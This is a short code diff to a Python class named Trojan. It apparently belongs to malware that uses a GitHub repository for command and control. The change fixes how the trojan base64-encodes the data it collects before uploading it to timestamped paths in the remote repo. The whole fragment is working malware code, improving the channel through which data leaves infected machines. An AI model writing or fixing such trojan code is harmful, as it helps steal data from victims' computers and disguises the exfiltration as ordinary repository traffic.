@@ -72,8 +72,7 @@ class Trojan:
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = bytes('%r' % data, 'utf-8')
-        enc = data.encode('utf-8')
-        self.repo.create_file(remote_path, message, base64.b64encode(enc))
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
     def run(self):
         while True:
